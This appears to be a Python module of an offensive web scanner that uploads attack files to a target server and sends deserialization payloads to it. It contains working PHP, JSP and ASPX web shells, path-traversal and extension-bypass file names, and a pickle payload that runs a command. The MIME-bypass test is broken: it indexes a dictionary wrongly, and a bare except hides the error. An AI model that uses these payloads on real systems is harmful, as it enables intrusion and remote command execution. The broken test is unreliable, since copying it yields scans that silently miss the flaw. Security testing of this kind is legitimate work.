"""
File Upload & Deserialization Module
- Unrestricted file upload
- File type bypass
- Insecure deserialization
- Malicious object instantiation
"""

import requests
import io
from typing import Dict, Any
import logging

logger = logging.getLogger(__name__)

class FileUploadDeserializationAnalyzer:
    """Analyze file upload and deserialization vulnerabilities"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        
    def test_unrestricted_file_upload(self, endpoint: str = '/api/upload') -> Dict[str, Any]:
        """Test unrestricted file upload"""
        logger.info(f"[*] Testing unrestricted file upload on {endpoint}...")
        
        # Test uploading malicious files
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            ('shell.aspx', '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe"); %>'),
            ('exploit.elf', b'\x7fELF\x01\x01\x01'),  # ELF binary
        ]
        
        for filename, content in malicious_files:
            try:
                if isinstance(content, str):
                    content = content.encode()
                
                files = {'file': (filename, io.BytesIO(content))}
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    files=files,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] Malicious file uploaded: {filename}")
                    return {
                        'vulnerable': True,
                        'uploaded_file': filename,
                        'response': resp.text[:200]
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_mime_type_bypass(self, endpoint: str = '/api/upload') -> Dict[str, Any]:
        """Test MIME type bypass"""
        logger.info(f"[*] Testing MIME type bypass on {endpoint}...")
        
        # Upload PHP with image MIME type
        php_content = b'<?php system($_GET["cmd"]); ?>'
        
        mime_types = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'text/plain'
        ]
        
        for mime_type in mime_types:
            try:
                files = {'file': ('shell.php', php_content, mime_type)}
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    files={'file': (files[1][0], files[1][1])},
                    headers={**self.headers, 'Content-Type': f'multipart/form-data; boundary=----'},
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] MIME bypass: PHP accepted as {mime_type}")
                    return {
                        'vulnerable': True,
                        'mime_type': mime_type
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_path_traversal_upload(self, endpoint: str = '/api/upload') -> Dict[str, Any]:
        """Test path traversal in file upload"""
        logger.info(f"[*] Testing path traversal in upload...")
        
        traversal_paths = [
            '../../../shell.php',
            '../../shell.php',
            '..\\..\\shell.php',
            'uploads/../shell.php'
        ]
        
        for path in traversal_paths:
            try:
                files = {'file': (path, b'<?php system($_GET["cmd"]); ?>')}
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    files=files,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] Path traversal in upload: {path}")
                    return {
                        'vulnerable': True,
                        'path': path
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_insecure_deserialization(self, endpoint: str = '/api/deserialize') -> Dict[str, Any]:
        """Test insecure deserialization"""
        logger.info(f"[*] Testing insecure deserialization...")
        
        # Java serialization exploit (ysoserial payload)
        java_payloads = [
            'rO0ABXsr',  # Java serialization magic bytes
        ]
        
        # Python pickle exploit
        python_payloads = [
            'cos\nsystem\n(S"id"\ntR.'
        ]
        
        payloads = java_payloads + python_payloads
        
        for payload in payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    data=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] Deserialization payload accepted")
                    return {
                        'vulnerable': True,
                        'technique': 'Insecure Deserialization'
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_double_extension(self, endpoint: str = '/api/upload') -> Dict[str, Any]:
        """Test double extension bypass"""
        logger.info(f"[*] Testing double extension bypass...")
        
        double_ext_files = [
            'shell.php.jpg',
            'shell.php.png',
            'shell.jpg.php',
            'shell.php%00.jpg'
        ]
        
        for filename in double_ext_files:
            try:
                files = {'file': (filename, b'<?php system($_GET["cmd"]); ?>')}
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    files=files,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] Double extension bypass: {filename}")
                    return {
                        'vulnerable': True,
                        'filename': filename
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_content_type_validation(self, endpoint: str = '/api/upload') -> Dict[str, Any]:
        """Test weak content-type validation"""
        logger.info(f"[*] Testing content-type validation...")
        
        try:
            # Null byte bypass
            files = {'file': ('shell.php\x00.jpg', b'<?php system($_GET["cmd"]); ?>')}
            resp = requests.post(
                f"{self.base_url}{endpoint}",
                files=files,
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            if resp.status_code in [200, 201]:
                logger.info(f"[+] Null byte bypass successful")
                return {
                    'vulnerable': True,
                    'technique': 'Null Byte Bypass'
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full file upload and deserialization analysis"""
        logger.info("[*] Starting file upload and deserialization analysis...")
        
        results = {
            'unrestricted_upload': self.test_unrestricted_file_upload(),
            'mime_type_bypass': self.test_mime_type_bypass(),
            'path_traversal': self.test_path_traversal_upload(),
            'double_extension': self.test_double_extension(),
            'content_type_validation': self.test_content_type_validation(),
            'insecure_deserialization': self.test_insecure_deserialization()
        }
        
        return results
